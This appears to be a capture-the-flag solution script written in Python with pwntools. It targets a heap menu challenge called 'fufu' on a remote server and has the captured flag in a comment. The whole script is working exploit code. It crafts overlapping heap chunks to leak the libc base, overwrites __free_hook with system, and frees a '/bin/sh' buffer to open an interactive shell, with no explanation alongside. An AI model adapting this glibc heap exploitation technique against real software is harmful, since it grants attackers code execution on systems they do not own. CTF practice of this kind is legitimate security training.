# kqctf{4_tru3_pwn_g0d_us3s_m4gn1tud3_4nd_drect10n}
from pwn import *

ld = ELF("./ld-2.31.so")
elf = ELF("./fufu")
libc = ELF("./libc-2.31.so")

#target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
target = remote("143.198.184.186", 5005)

if True:
    counter = 0
    def sla(s, d):
        target.sendlineafter(s, str(d))

    def create(size, data="whoamiT"):
        global counter
        c = chr(0x61+counter)       # Tag pointers for easy identification
        counter = counter + 1
        sla("?", 1)
        sla("?", 0)
        sla("?", size)
        if data == "whoamiT":
            data = c*0x20
        sla("content.", data)
        print ".",

    def display():
        sla("?", 2)
        sla("?", 0)
        target.recvuntil("shows:\n")
        return target.recvline().strip("\n")

    def reset():
        sla("?", 3)
        sla("?", 0)

    def dbg(free=1):
        if free:
            sla("?", "1\n0")
        gdb.attach(target, 'heap chunks\nheap bins')

create(0x48)
create(0x28)
create(0x300)
create(0x168)
create(0x10)
create(0x300, p64(0x31)*(0x80/8) + "A"*0x48 + p64(0x91))
create(0x28)
create(0x88, "B"*0x28 + p64(0x481) + p64(0) + p64(0x41)*(0x48/8) + p64(0)*5 + p64(0x91) + p64(0)*9 + p64(0x31))
create(0x48)
create(0x300)
create(0x88, "A"*0x80)

libc_base = u64(display()[0x80:].strip("\n").ljust(8, '\x00')) - 0x7f976058fbe0 + 0x7f97603d1000
log.info("LIBC Base: " + hex(libc_base))

create(0x88, "A"*0x78 + p64(0x481))

create(0x68)
create(0x138, p64(0x31)*16 + p64(0) + p64(0x91))
create(0x68)

create(0x138, p64(0x31)*16 + p64(0) + p64(0x91) + p64(libc_base + libc.sym['__free_hook'] - 0x10))
create(0x88)
reset()
create(0x88, "/bin/sh\x00" + p64(0) + p64(libc_base + libc.sym['system']))
sla("?", "1\n0")
#dbg()

target.interactive()